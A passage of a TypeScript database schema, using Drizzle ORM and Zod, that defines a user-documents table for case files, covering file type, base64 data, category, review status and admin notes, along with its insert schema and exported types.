  caseId: varchar("case_id").notNull().references(() => cases.id),
  fileName: text("file_name").notNull(),
  fileType: text("file_type").notNull(), // 'pdf', 'image', 'doc'
  fileData: text("file_data"), // base64 encoded
  fileSize: text("file_size"),
  category: text("category").default('general'), // 'id_proof', 'transaction', 'evidence', 'general'
  description: text("description"),
  status: text("status").default('uploaded'), // 'uploaded', 'reviewed', 'approved', 'rejected'
  adminNotes: text("admin_notes"),
  uploadedAt: timestamp("uploaded_at").notNull().default(sql`now()`),
});

export const insertUserDocumentSchema = createInsertSchema(userDocuments).omit({
  id: true,
  uploadedAt: true,
});

export type InsertUserDocument = z.infer<typeof insertUserDocumentSchema>;
export type UserDocument = typeof userDocuments.$inferSelect;
